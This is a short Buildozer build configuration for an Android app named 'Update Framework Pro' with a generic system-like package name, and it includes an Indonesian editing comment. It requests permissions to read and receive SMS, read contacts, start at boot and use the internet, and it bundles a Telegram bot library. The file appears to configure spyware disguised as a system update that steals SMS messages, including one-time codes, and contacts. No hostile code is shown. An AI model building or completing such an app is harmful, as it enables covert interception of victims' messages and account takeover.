[app]
title = Update Framework Pro
package.name = core_system_v4
package.domain = com.core.internal
version = 4.1

# GANTI INI: hapus baris services yang lama, biarkan kosong atau hapus saja
# services = 

requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi
android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED, READ_CONTACTS
android.api = 28
android.minapi = 21
